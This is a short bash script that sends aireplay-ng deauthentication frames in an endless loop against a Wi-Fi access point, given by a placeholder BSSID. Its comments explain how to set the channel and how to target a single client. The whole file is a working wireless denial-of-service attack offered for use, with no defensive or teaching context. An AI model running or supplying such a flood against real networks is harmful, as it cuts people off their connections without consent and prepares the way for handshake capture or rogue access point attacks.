#!/bin/bash
#You need to set correct channel first (using airodump -c 2 for example)
#Add -c <client_MAC> option to aireplay-ng command if you want to deauth specific client

BSSID=00:11:22:33:44:55

while true
do aireplay-ng --deauth 1 -a $BSSID  wlan1mon
done